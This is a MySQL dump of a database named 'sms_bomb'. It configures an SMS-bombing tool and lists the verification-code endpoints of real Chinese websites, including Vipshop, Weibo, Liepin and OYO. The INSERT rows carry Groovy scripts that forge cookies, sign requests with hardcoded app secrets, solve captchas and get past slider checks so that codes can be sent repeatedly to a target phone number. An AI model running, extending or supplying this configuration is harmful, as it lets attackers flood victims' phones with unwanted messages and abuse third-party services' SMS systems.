-- ----------------------------
-- Table structure for s_sms_send_log
-- ----------------------------
DROP TABLE IF EXISTS `s_sms_send_log`;
CREATE TABLE `s_sms_send_log`  (
  `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
  `request_id` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `phone` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `ip` varchar(128) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `sms_url` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `web_site_name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `params` varchar(1024) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `response` varchar(1024) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `create_at` timestamp(0) NULL DEFAULT CURRENT_TIMESTAMP(0),
  `request_duration` int(11) NULL DEFAULT NULL COMMENT '请求持续时间单位ms',
  `response_status` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT 'SUCCESS、FAILURE',
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `idx_createAt`(`create_at`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Table structure for s_sms_url
-- ----------------------------
DROP TABLE IF EXISTS `s_sms_url`;
CREATE TABLE `s_sms_url`  (
  `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT,
  `icon` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '网站logo',
  `website_name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '网站名称',
  `website` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '网站首页',
  `sms_url` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '短信接口',
  `phone_param_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '手机号名称',
  `binding_params` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '其它固定请求参数，json字符串',
  `create_at` timestamp(0) NULL DEFAULT CURRENT_TIMESTAMP(0),
  `update_at` timestamp(0) NULL DEFAULT CURRENT_TIMESTAMP(0) ON UPDATE CURRENT_TIMESTAMP(0),
  `is_normal` tinyint(1) NULL DEFAULT 1 COMMENT '1=正常，0=失效',
  `business_name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '业务类型（标注用）。如：注册、找回',
  `success_code` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '响应成功code。key=code,value=200',
  `end_code` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL,
  `open_script` tinyint(1) NULL DEFAULT NULL COMMENT '是否使用脚本，1=标识使用',
  `script_name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '脚本名称',
  `script_content` text CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL COMMENT '脚本内容',
  `script_path` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '脚本执行路径。优先使用字段script_content',
  `request_method` varchar(10) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT 'GET、POST',
  `content_type` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '请求参数类型：application/x-www-form-urlencoded、application/json',
  `headers` varchar(1024) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '固定请求头。例：[Refer=xxx][key=value]',
  `response_type` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT 'json' COMMENT '响应内容类型。如：json、xml、text',
  `last_used_time` datetime(0) NULL DEFAULT NULL COMMENT '最后使用时间',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = Dynamic;

ALTER TABLE `sms_bomb`.`s_sms_url`
ADD COLUMN `max_retry_times` int(0) NULL COMMENT '发送失败时，最大尝试次数' AFTER `last_used_time`;


INSERT INTO `sms_bomb`.`s_sms_url`(`id`, `icon`, `website_name`, `website`, `sms_url`, `phone_param_name`, `binding_params`, `binding_query_params`, `create_at`, `update_at`, `is_normal`, `business_name`, `success_code`, `end_code`, `open_script`, `script_name`, `script_content`, `script_path`, `request_method`, `content_type`, `headers`, `response_type`, `last_used_time`, `max_retry_times`) VALUES (2, '', '唯品会', 'https://www.baidu.com', 'https://passport.vip.com/register/sendSms', 'mobile', '', '', '2020-11-29 18:58:45', '2023-01-10 00:48:16', 0, '注册', 'key=code,value=200', '', 1, 'VipScript', 'package com.lei2j.sms.bomb.script\n\nimport com.lei2j.sms.bomb.entity.SmsUrlConfig\nimport com.lei2j.sms.bomb.service.impl.ScriptContext\nimport org.slf4j.LoggerFactory\nimport org.slf4j.Logger\n\nimport java.nio.charset.StandardCharsets\n\n/**\n * www.vip.com\n * 唯品会\n */\nclass VipScript implements SmsScript {\n\n    private final Logger logger = LoggerFactory.getLogger(VipScript.class)\n\n    @Override\n    void preProcess(ScriptContext scriptContext) {\n        setHeaders(scriptContext.getSmsUrlConfig(), scriptContext.getHeaderMap())\n    }\n\n    private void setHeaders(SmsUrlConfig smsUrlConfig, Map<String, String> headerMap) throws IOException {\n        def cookieList = []\n        def a = \"${System.currentTimeMillis() + \'_\' + rand()}\"\n        def split = a.split(\"_\")\n        def ch1 = split[0].toCharArray()\n        def ch2 = split[1].toCharArray()\n        def e = 0\n        for (def f = ch1.length, g = 0; g < f; g++) {\n            e += Integer.parseInt(Character.toString(ch1[g]))\n        }\n        def h = e % 32, i = e, j = ch2.length\n        for (def g = 0; g < j; g++) {\n            if (g != h) {\n                i += Integer.parseInt(Character.toString(ch2[g]), 16)\n            }\n        }\n        def k = Integer.toHexString(i % 16)\n        def cid = String.valueOf(ch1) + \"_\" + String.valueOf(ch2, 0, h) + k + String.valueOf(ch2, h + 1, Math.min(j, ch2.length - h - 1))\n        cookieList << \"mars_cid=${URLEncoder.encode(cid, \"UTF-8\")}\"\n        cookieList << \"mars_sid=${URLEncoder.encode(rand(),\"UTF-8\")}\"\n        cookieList << \"visit_id=${URLEncoder.encode(rand(),\"UTF-8\")}\"\n        cookieList << \"mars_pid=${URLEncoder.encode(\'0\', StandardCharsets.UTF_8.name())}\"\n        def cookie = String.join(\";\", cookieList)\n        String o1 = headerMap.computeIfPresent(\"Cookie\", (key, val) -> (val + (val.endsWith(\";\") ? \"\" : \";\") + cookie))\n        String o2 = headerMap.computeIfPresent(\"cookie\", (key, val) -> (val + (val.endsWith(\";\") ? \"\" : \";\") + cookie))\n        if (o1 == null && o2 == null) {\n            headerMap[\'Cookie\'] = cookie\n        }\n    }\n\n    private String rand() {\n        def a = new StringBuilder()\n        def random = new Random()\n        def b = [\'0\',\'1\',\'2\',\'3\',\'4\',\'5\',\'6\',\'7\',\'8\',\'9\',\'a\',\'b\',\'c\',\'d\',\'e\',\'f\'] as char[]\n        for (int d = 0; d < 32; d++) {\n            a.append(b[random.nextInt(b.length)])\n        }\n        a.toString()\n    }\n}', NULL, 'POST', 'application/x-www-form-urlencoded', '', 'json', NULL, 3);
INSERT INTO `sms_bomb`.`s_sms_url`(`id`, `icon`, `website_name`, `website`, `sms_url`, `phone_param_name`, `binding_params`, `binding_query_params`, `create_at`, `update_at`, `is_normal`, `business_name`, `success_code`, `end_code`, `open_script`, `script_name`, `script_content`, `script_path`, `request_method`, `content_type`, `headers`, `response_type`, `last_used_time`, `max_retry_times`) VALUES (5, 'https://img.t.sinajs.cn/t6/style/images/global_nav/WB_logo.png?id=1404211047727', '新浪微博', 'https://weibo.com/', 'https://weibo.com/signup/v5/formcheck', 'value', '{\"type\":\"sendsms\",\"entry\":\"default\",\"zone\":\"0086\"}', NULL, '2020-12-13 16:02:08', '2022-12-31 17:55:44', 0, '注册', 'key=code,value=100000', '', 0, '', '', NULL, 'GET', 'application/x-www-form-urlencoded', '[Referer: https://weibo.com/signup/signup.php]', 'json', NULL, 3);
INSERT INTO `sms_bomb`.`s_sms_url`(`id`, `icon`, `website_name`, `website`, `sms_url`, `phone_param_name`, `binding_params`, `binding_query_params`, `create_at`, `update_at`, `is_normal`, `business_name`, `success_code`, `end_code`, `open_script`, `script_name`, `script_content`, `script_path`, `request_method`, `content_type`, `headers`, `response_type`, `last_used_time`, `max_retry_times`) VALUES (7, 'https://concat.lietou-static.com/fe-www-pc/v5/images/plugins/publicHeader/common/logo.9eb08a4d.png', '猎聘网', 'https://www.liepin.com/', 'https://basepassport.liepin.com/verificationcode/tel/v3/sendbytel.json', 'tel', '{\"callback\":\"jsonp638126\",\"businessId\":\"1100100012\",\"captchaData\":\"{}\"}', '', '2021-02-28 01:12:23', '2023-01-10 00:47:27', 0, '登录', '', '', 1, 'LiePin.groovy', 'package com.lei2j.sms.bomb.script\n\nimport com.lei2j.sms.bomb.entity.SmsUrlConfig\nimport com.lei2j.sms.bomb.service.impl.ScriptContext\nimport com.lei2j.sms.bomb.util.HttpUtils\nimport groovy.json.JsonSlurper\n\nclass LiePinScript implements SmsScript{\n\n    private final static String FRONT_URL = \"https://basepassport.liepin.com/verificationcode/v1/getsmartcaptchainitialconfig.json\"\n\n    @Override\n    void preProcess(ScriptContext scriptContext) {\n        SmsUrlConfig smsBomb = scriptContext.getSmsUrlConfig()\n        Map<String, String> paramsMap = scriptContext.getParamsMap()\n        Map<String, String> headerMap = scriptContext.getHeaderMap()\n        def preParamMap = [callback: \'jsonp1\', businessId: \'1100100012\', type: \'1\', version: \'1\']\n        def jsonp = HttpUtils.get(FRONT_URL, preParamMap, headerMap)\n        def response = parseJsonp(preParamMap.callback, jsonp, 1, 0)\n        def object = new JsonSlurper().parseText(response)\n        paramsMap.captchaSign = object.data.captchaSign\n    }\n\n    String parseJsonp(String callback, String jsonp, int paramNumber, int paramIndex) {\n        def response = jsonp.substring(callback.length() + 1, jsonp.length() - 1)\n        response.split(\",\", paramNumber)[paramIndex]\n    }\n}', NULL, 'GET', 'application/json', '[Referer=https://www.liepin.com/]', 'json', NULL, 3);
INSERT INTO `sms_bomb`.`s_sms_url`(`id`, `icon`, `website_name`, `website`, `sms_url`, `phone_param_name`, `binding_params`, `binding_query_params`, `create_at`, `update_at`, `is_normal`, `business_name`, `success_code`, `end_code`, `open_script`, `script_name`, `script_content`, `script_path`, `request_method`, `content_type`, `headers`, `response_type`, `last_used_time`, `max_retry_times`) VALUES (10, 'https://www.panpay.com/_nuxt/img/21ccc58.png', '泛付 PanPay', 'https://www.panpay.com/', 'https://www.panpay.com/e-bank/verifyPhoneCode.do', 'phone', '{\"tplType\":\"01\",\"type\":\"BIND_PHONE\",\"phoneCountry\":\"86\"}', NULL, '2021-03-25 06:49:42', '2022-12-31 17:55:44', 0, '注册', 'key=success,value=true', 'key=success,value=false', NULL, '', '', NULL, 'POST', 'application/x-www-form-urlencoded', NULL, 'json', NULL, 3);
INSERT INTO `sms_bomb`.`s_sms_url`(`id`, `icon`, `website_name`, `website`, `sms_url`, `phone_param_name`, `binding_params`, `binding_query_params`, `create_at`, `update_at`, `is_normal`, `business_name`, `success_code`, `end_code`, `open_script`, `script_name`, `script_content`, `script_path`, `request_method`, `content_type`, `headers`, `response_type`, `last_used_time`, `max_retry_times`) VALUES (160895528584876032, 'https://zgsta.zhuge.com/static/common/images/commonLogo/new-logo.png', '诸葛找房', 'http://id.zhuge.com/', 'https://api.zhuge.com/c_user/api/v1/authCode/smsSend', 'mobile', '{\"type\":\"1\"}', '', '2022-11-27 23:41:23', '2023-01-10 00:46:32', 0, '快捷登录', 'key=code,value=200', '', 1, 'ZhugeFangScript', 'package com.lei2j.sms.bomb.script\n\nimport com.lei2j.sms.bomb.service.impl.ScriptContext\n\nclass ZhugeFangScript extends SmsCommonScript{\n\n    @Override\n    void preProcess(ScriptContext scriptContext) {\n        super.preProcess(scriptContext)\n        scriptContext.getParamsMap().computeIfPresent(\"type\",(key,val)->{Integer.parseInt(val.toString())})\n    }\n}\n', NULL, 'POST', 'application/json', '[Referer: http://id.zhuge.com/][zg-app-name: zgzf][zg-client: pc]', 'json', NULL, 3);
INSERT INTO `sms_bomb`.`s_sms_url`(`id`, `icon`, `website_name`, `website`, `sms_url`, `phone_param_name`, `binding_params`, `binding_query_params`, `create_at`, `update_at`, `is_normal`, `business_name`, `success_code`, `end_code`, `open_script`, `script_name`, `script_content`, `script_path`, `request_method`, `content_type`, `headers`, `response_type`, `last_used_time`, `max_retry_times`) VALUES (161251664651620352, 'https://htef3bvmquzmmr67.oss-cn-hangzhou.aliyuncs.com/2022-08-02/3e486d0694a18e709a7f043f6b83e2c1.png', 'MarryU婚恋网', 'https://51marryyou.com/', 'https://51marryyou.com/Index/getSmsCode', 'phone', '', NULL, '2022-11-28 23:16:33', '2022-12-31 17:55:44', 0, '登录/注册', 'key=err,value=0', '', NULL, '', '', NULL, 'POST', 'application/x-www-form-urlencoded', '[Referer: https://51marryyou.com/]', 'json', NULL, 3);
INSERT INTO `sms_bomb`.`s_sms_url`(`id`, `icon`, `website_name`, `website`, `sms_url`, `phone_param_name`, `binding_params`, `binding_query_params`, `create_at`, `update_at`, `is_normal`, `business_name`, `success_code`, `end_code`, `open_script`, `script_name`, `script_content`, `script_path`, `request_method`, `content_type`, `headers`, `response_type`, `last_used_time`, `max_retry_times`) VALUES (161264827119964160, 'https://res.qiremanhua.com/pc/images/logo.png', '奇热漫画', 'https://www.qiremanhua.com/', 'https://www.qiremanhua.com/passport/send_msg_code', 'phone', '', '', '2022-11-29 00:08:51', '2023-01-10 00:45:50', 0, '注册', 'key=status,value=1', '', 1, 'QiremanhuaScript', 'package com.lei2j.sms.bomb.script\n\nimport com.lei2j.sms.bomb.entity.SmsUrlConfig\nimport com.lei2j.sms.bomb.service.impl.ScriptContext\n\nclass QiremanhuaScript extends SmsCommonScript {\n\n    @Override\n    void preProcess(ScriptContext scriptContext) {\n        SmsUrlConfig smsUrlConfig = scriptContext.getSmsUrlConfig()\n        Map<String, Object> paramsMap = scriptContext.getParamsMap()\n        Map<String, String> headerMap = scriptContext.getHeaderMap()\n        super.preProcess(scriptContext)\n        def millis = System.currentTimeMillis()\n        paramsMap.put(\"param_random\",millis)\n        paramsMap.put(\"send_random\",millis)\n        headerMap.put(\"Random\", String.valueOf(millis))\n    }\n}\n', NULL, 'POST', 'application/x-www-form-urlencoded', '[Referer:https://www.qiremanhua.com/passport/reg/?redirectUri=%2F]', 'json', NULL, 3);
INSERT INTO `sms_bomb`.`s_sms_url`(`id`, `icon`, `website_name`, `website`, `sms_url`, `phone_param_name`, `binding_params`, `binding_query_params`, `create_at`, `update_at`, `is_normal`, `business_name`, `success_code`, `end_code`, `open_script`, `script_name`, `script_content`, `script_path`, `request_method`, `content_type`, `headers`, `response_type`, `last_used_time`, `max_retry_times`) VALUES (169765939552718848, 'https://s1.huishoubao.com/static/pc/1001/img/logo.png', '回收宝', 'https://www.huishoubao.com/', 'https://api.huishoubao.com/api/user/getCode', 'tel', '', '', '2022-12-22 11:09:14', '2023-01-10 00:45:06', 0, '注册/登录', 'key=_errCode,value=0', '', 1, 'HuiShouBaoSmsScript', 'package com.lei2j.sms.bomb.script\n\nimport com.alibaba.fastjson.JSONObject\nimport com.lei2j.sms.bomb.entity.SmsUrlConfig\nimport com.lei2j.sms.bomb.service.impl.ScriptContext\n\nimport java.util.stream.Collectors\n\nclass HuiShouBaoSmsScript extends SmsCommonScript{\n\n    private final static String APP_SECRET = \'b7cab12b2b81385dd2cccb8ce67e4998\'\n\n    @Override\n    void preProcess(ScriptContext scriptContext) {\n        SmsUrlConfig smsUrlConfig = scriptContext.getSmsUrlConfig()\n        Map<String, Object> paramsMap = scriptContext.getParamsMap()\n        Map<String, String> headerMap = scriptContext.getHeaderMap()\n        paramsMap.put(\"imgCode\", \"\")\n        super.preProcess(scriptContext)\n\n        //设置签名\n        Map<String, Object> queryMap = new HashMap<>()\n        queryMap.put(\"pid\", \"1001\")\n        queryMap.put(\"platform\", \"8\")\n        queryMap.put(\"version\",\"1\")\n        queryMap.put(\"timestamp\", (int)(System.currentTimeMillis() / 1000))\n        def random = new Random()\n        String ukey = \"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx\".replaceAll(\"[xy]\", (String c) -> {\n            int r = random.nextInt(16)\n            Integer v =  c == \'x\'? r : (r & 3) | 8\n            return Integer.toString(v, 16)\n        }).replaceAll(\"-\", \"\")\n        queryMap.put(\"ukey\", ukey)\n        def jSONObject = new JSONObject()\n        jSONObject.putAll(queryMap)\n        jSONObject.putAll(paramsMap)\n        def sortMap = jSONObject.sort()\n        def sort = sortMap.keySet().sort()\n        List<String> kv = sort.stream().filter(p -> {\n            return sortMap.get(p) != null\n        }).map(key -> key + sortMap.get(key))\n                .collect(Collectors.toList())\n        //imgCode pid1001 platform8 tel18963262542 timestamp1672246576 ukeyf852f4b8bbda42818fd36b996905d6f1 version1 b7cab12b2b81385dd2cccb8ce67e4998\n        String originSignStr = String.join(\"\", kv) + APP_SECRET\n        def list = queryMap.sort().collect { k, v -> k + \"=\" + v }\n        smsUrlConfig.getSmsUrl().indexOf(\"?\") != -1 ? smsUrlConfig.setSmsUrl(smsUrlConfig.getSmsUrl() + String.join(\"&\", list))\n                : smsUrlConfig.setSmsUrl(smsUrlConfig.getSmsUrl() + \"?\" + String.join(\"&\", list))\n        smsUrlConfig.setSmsUrl(smsUrlConfig.getSmsUrl() + \"&sign=\" + originSignStr.digest(\"SHA-1\"))\n\n    }\n\n}\n', NULL, 'POST', 'application/x-www-form-urlencoded', '[Referer:https://www.huishoubao.com/][Accept:*/*]', 'json', NULL, 2);
INSERT INTO `sms_bomb`.`s_sms_url`(`id`, `icon`, `website_name`, `website`, `sms_url`, `phone_param_name`, `binding_params`, `binding_query_params`, `create_at`, `update_at`, `is_normal`, `business_name`, `success_code`, `end_code`, `open_script`, `script_name`, `script_content`, `script_path`, `request_method`, `content_type`, `headers`, `response_type`, `last_used_time`, `max_retry_times`) VALUES (173243517278097408, 'https://s01.10101111cdn.com/ucarwebrm/images/ucar_logo_49a38cc95ef8d8d3ebd5eb78c35245ae.png', '神州专车', 'https://www.10101111.com/', 'https://my.10101111.com/api/login/preValidateCode.do', 'mobileNum', '{\"countryCode\":\"86\"}', '', '2023-01-01 01:27:53', '2023-01-16 22:25:06', 0, '登录', 'key=re,value=0', '', 1, 'ShenzhouCarScript', 'package com.lei2j.sms.bomb.script\n\nimport com.lei2j.sms.bomb.entity.SmsUrlConfig\nimport com.lei2j.sms.bomb.service.impl.ScriptContext\nimport com.lei2j.sms.bomb.util.HttpUtils\nimport groovy.json.JsonSlurper\nimport org.apache.commons.lang3.RandomStringUtils\nimport org.apache.http.HeaderElement\nimport org.springframework.beans.BeanUtils\n\nclass ShenzhouCarScript extends SmsCommonScript {\n\n    String imgUrl = \"https://www.10101111.com/common/imgCaptcha.do\"\n\n    /**\n     * step2\n     */\n    String getValidateCodeUrl = \"https://my.10101111.com/api/login/getValidateCode.do\"\n\n    @Override\n    void preProcess(ScriptContext scriptContext) {\n        SmsUrlConfig smsUrlConfig = scriptContext.getSmsUrlConfig()\n        Map<String, Object> paramsMap = scriptContext.getParamsMap()\n        Map<String, String> headerMap = scriptContext.getHeaderMap()\n        super.preProcess(scriptContext)\n        if (!headerMap.containsKey(\"Cookie\") && !headerMap.containsKey(\"cookie\")) {\n            if (!headerMap.containsKey(\"Cookie\") || !String.valueOf(headerMap.get(\"Cookie\")).contains(\"ucar-intranet-sid\")) {\n                Map<String, List<HeaderElement[]>> headers = HttpUtils.getHeaders(imgUrl)\n                List<HeaderElement[]> cookies = headers.get(\"Set-Cookie\")\n                def sb = new StringBuilder(String.valueOf(headerMap.get(\"Cookie\")))\n                cookies.forEach(ck -> {\n                    sb.append(\";\" + ck[0].name + \"=\" + ck[0].value)\n                })\n                headerMap.put(\"Cookie\", sb.toString())\n            } else if (!headerMap.containsKey(\"cookie\") || !String.valueOf(headerMap.get(\"cookie\")).contains(\"ucar-intranet-sid\")) {\n                Map<String, List<HeaderElement[]>> headers = HttpUtils.getHeaders(imgUrl)\n                List<HeaderElement[]> cookies = headers.get(\"Set-Cookie\")\n                def sb = new StringBuilder(String.valueOf(headerMap.get(\"Cookie\")))\n                cookies.forEach(ck -> {\n                    sb.append(\";\" + ck[0].name + \"=\" + ck[0].value)\n                })\n                headerMap.put(\"cookie\", sb.toString())\n            }\n        }\n        String url = imgUrl +\"?t=\"+ new Random().nextInt(100)\n        def openStream = HttpUtils.getStreaming(url, headerMap)\n        def captcha = identifyImgCaptcha(openStream)\n        paramsMap.put(\"callback\", \"jQuery\" + RandomStringUtils.randomNumeric(20) + \"_\" + System.currentTimeMillis())\n        paramsMap.put(\"countryCode\", \"86\")\n        paramsMap.put(\"checkCode\", captcha.toLowerCase())\n    }\n\n    @Override\n    Boolean postProcess(ScriptContext scriptContext) {\n        SmsUrlConfig smsUrlConfig = scriptContext.getSmsUrlConfig()\n        Map<String, Object> paramsMap = scriptContext.getParamsMap()\n        Map<String, String> headerMap = scriptContext.getHeaderMap()\n        String response = scriptContext.getResponse()\n        def step1Matcher = response =~ /^${paramsMap.get(\"callback\")}\\((?<json>.*)\\)$/\n        if (!step1Matcher.matches()) {\n            return false\n        }\n        ScriptContext copyContext = new ScriptContext()\n        BeanUtils.copyProperties(scriptContext, copyContext)\n        copyContext.setResponse(step1Matcher.group(\'json\'))\n        def success = super.postProcess(copyContext)\n        if (!success) {\n            return false\n        }\n        Map<String, Object> step2Map = new HashMap<>()\n        step2Map.put(\"callback\", paramsMap.get(\"callback\"))\n        /*\n          源网站js响应处理逻辑\n          if (\"0\" === data.re) {\n            var count = 60;\n            countDownFun(count, mobileNum, countryCode);\n        } else if (\"1\" === data.re) {\n            baseModule.errorNotify(\"validateCode\", data.msg);\n        } else if (\"2\" === data.re) {\n            gotoImgValidateCodeView();\n        }*/\n        def step2Response = HttpUtils.get(getValidateCodeUrl, step2Map, headerMap)\n        def matcher = step2Response =~ /^${paramsMap.get(\"callback\")}\\((?<json>.*)\\)$/\n        assert matcher.matches()\n        def jsonp = matcher.group(\'json\')\n        def jsonObj = new JsonSlurper().parseText(jsonp)\n        jsonObj[\'re\'] == \'0\'\n    }\n\n}\n', NULL, 'GET', 'application/x-www-form-urlencoded', '[Referer: https://www.10101111.com/][Cookie: loc-city=%7B%22id%22%3A%2220%22%2C%22name%22%3A%22%E6%AD%A6%E6%B1%89%22%2C%22enName%22%3A%22wuhan%22%2C%22lat%22%3A%2230.593099%22%2C%22lng%22%3A%22114.305393%22%7D;]', 'json', NULL, 1);
INSERT INTO `sms_bomb`.`s_sms_url`(`id`, `icon`, `website_name`, `website`, `sms_url`, `phone_param_name`, `binding_params`, `binding_query_params`, `create_at`, `update_at`, `is_normal`, `business_name`, `success_code`, `end_code`, `open_script`, `script_name`, `script_content`, `script_path`, `request_method`, `content_type`, `headers`, `response_type`, `last_used_time`, `max_retry_times`) VALUES (173603170054836224, 'http://res.fengj.com/images/lanmu_logo/index_logo.png', '网优咨询-二手网', 'http://www.fengj.com/', 'http://csshop.fengj.com/action/regestermobileyzm.ashx', 'mobile', '{\"refer\":\"http%3A//csshop.fengj.com/company_admin_new/userRegisterPage.aspx\"}', '', '2023-01-02 01:17:01', '2023-01-10 00:39:39', 0, '注册', 'key=result,value=3', '', 1, 'FengjScript', 'package com.lei2j.sms.bomb.script\n\nimport com.lei2j.sms.bomb.entity.SmsUrlConfig\nimport com.lei2j.sms.bomb.service.impl.ScriptContext\nimport com.lei2j.sms.bomb.util.HttpUtils\n\nimport javax.crypto.Cipher\nimport javax.crypto.SecretKeyFactory\nimport javax.crypto.spec.DESKeySpec\nimport javax.crypto.spec.IvParameterSpec\nimport java.nio.charset.StandardCharsets\n\n/**\n * 网优咨询-二手网\n */\nclass FengjScript extends SmsCommonScript {\n\n    private String slideValidationUrl = \'http://csshop.fengj.com/action/regestermobileyzm.ashx\'\n\n    @Override\n    void preProcess(ScriptContext scriptContext) {\n        SmsUrlConfig smsUrlConfig = scriptContext.getSmsUrlConfig()\n        Map<String, Object> paramsMap = scriptContext.getParamsMap()\n        Map<String, String> headerMap = scriptContext.getHeaderMap()\n        super.preProcess(scriptContext)\n        slideValidate(smsUrlConfig, paramsMap, headerMap)\n        def cipher = Cipher.getInstance(\"DES/CBC/PKCS5Padding\")\n        cipher.init(Cipher.ENCRYPT_MODE, SecretKeyFactory.getInstance(\"DES\").generateSecret(new DESKeySpec(\'desk2017\'.getBytes(\'UTF-8\'))), new IvParameterSpec(\"15646315\".getBytes(StandardCharsets.UTF_8)))\n        def encrypted = cipher.doFinal(paramsMap.get(smsUrlConfig.getPhoneParamName()).toString().getBytes(StandardCharsets.UTF_8)).encodeHex().toString().getBytes(StandardCharsets.UTF_8)\n        paramsMap.put(smsUrlConfig.getPhoneParamName(),Base64.encoder.encodeToString(encrypted))\n    }\n\n    /**\n     * 滑块验证\n     */\n    private void slideValidate(SmsUrlConfig smsUrlConfig, Map<String, Object> paramsMap, Map<String, String> headerMap) {\n        Map<String, String> preParamsMap = [action: \'SLIDERVALIDATION\', Mobile: String.valueOf(paramsMap.get(smsUrlConfig.getPhoneParamName()))]\n        def preResponse = HttpUtils.postFormUrlencoded(slideValidationUrl, preParamsMap, headerMap, null)\n        paramsMap.put(\'mobmd5\', preResponse)\n    }\n}\n', NULL, 'POST', 'application/x-www-form-urlencoded', '[Referer: http://csshop.fengj.com/company_admin_new/userRegisterPage.aspx][Cookie: Hm_lvt_20a4d2d8002af8a5cc4f32cee1470a9f=1672586271; ASP.NET_SessionId=whjbroxofs2qwr1klyfcyroz; Hm_lpvt_20a4d2d8002af8a5cc4f32cee1470a9f=1672586963][Accept: text/plain, */*; q=0.01]', 'json', NULL, 1);
INSERT INTO `sms_bomb`.`s_sms_url`(`id`, `icon`, `website_name`, `website`, `sms_url`, `phone_param_name`, `binding_params`, `binding_query_params`, `create_at`, `update_at`, `is_normal`, `business_name`, `success_code`, `end_code`, `open_script`, `script_name`, `script_content`, `script_path`, `request_method`, `content_type`, `headers`, `response_type`, `last_used_time`, `max_retry_times`) VALUES (173849870421987328, 'https://www.oyohotels.cn/wp-content/uploads/2021/12/2021122211070352.png', 'OYO酒店', 'https://www.oyohotels.cn/', 'https://bff.oyohotels.top/identity/api/v1/otp/generate_by_phone', 'phone', '{\"country_code\":\"+86\",\"country_iso_code\":\"CN\",\"nod\":\"4\",\"send_otp\":\"true\",\"devise_role\":\"Consumer_Guest\",\"version\":\"20429\"}', '', '2023-01-02 17:37:19', '2023-01-10 00:37:42', 0, '注册', 'key=response_status.status,value=true', '', 1, 'OYOScript', 'package com.lei2j.sms.bomb.script\n\nimport com.lei2j.sms.bomb.entity.SmsUrlConfig\nimport com.lei2j.sms.bomb.service.impl.ScriptContext\nimport com.lei2j.sms.bomb.util.HttpUtils\nimport groovy.json.JsonSlurper\n\n/**\n * OYO酒店\n */\nclass OYOScript extends SmsCommonScript {\n\n    private String preUrl = \'https://bff.oyohotels.top/v1/app_init\'\n\n    private static final char[] hex = new char[]{\'0\', \'1\', \'2\', \'3\', \'4\', \'5\', \'6\', \'7\', \'8\', \'9\', \'a\', \'b\', \'c\', \'d\', \'e\', \'f\'}\n\n    private String token = \'QmpDZlRxZWo2UkZ5M3pSeHZ5NW46bi13NHN0ZTV5V1I1aGpCUVVHOUM=\'\n\n    @Override\n    void preProcess(ScriptContext scriptContext) {\n        SmsUrlConfig smsUrlConfig = scriptContext.getSmsUrlConfig()\n        Map<String, Object> paramsMap = scriptContext.getParamsMap()\n        Map<String, String> headerMap = scriptContext.getHeaderMap()\n        super.preProcess(scriptContext)\n        String androidId = generateAndroidId(16)\n        paramsMap.put(\'android_id\', androidId)\n        def preParamsMap = [client_type: String.valueOf(headerMap[\'client_type\']),\n                            on_boarding_flow: true,\n                            social_login_feature: true,\n                            social_ui_enabled: true,\n                            version: String.valueOf(paramsMap[\'version\']),\n                            partner_app_version: String.valueOf(paramsMap[\'version\']),\n                            android_id: androidId,\n                            idfa: \'\',\n                            sid: System.currentTimeMillis()]\n        headerMap[\'access_token\'] = token\n        headerMap[\'Authorization\'] = \'Basic \' + token\n        headerMap[\'did\'] = androidId\n        def preResponse = HttpUtils.get(preUrl, preParamsMap, headerMap)\n        def jsonObject = new JsonSlurper().parseText(preResponse)\n        headerMap[\'OYO_AB_CONFIG\'] = jsonObject.ab_service_data.config\n    }\n\n    private static String generateAndroidId(int length){\n        def random = new Random()\n        StringBuilder sb = new StringBuilder()\n        for (int i = 0; i < length; i++) {\n            sb.append(hex[random.nextInt(hex.length)])\n        }\n        sb\n    }\n}\n', NULL, 'POST', 'application/json', '[User-Agent:Dalvik/2.1.0 (Linux; U; Android 10; ELE-AL00 Build/HUAWEIELE-AL00)][idfa:][client_type:Android App][Accept-Language:zh][SEGMENT_CONFIG:default]', 'json', NULL, 2);
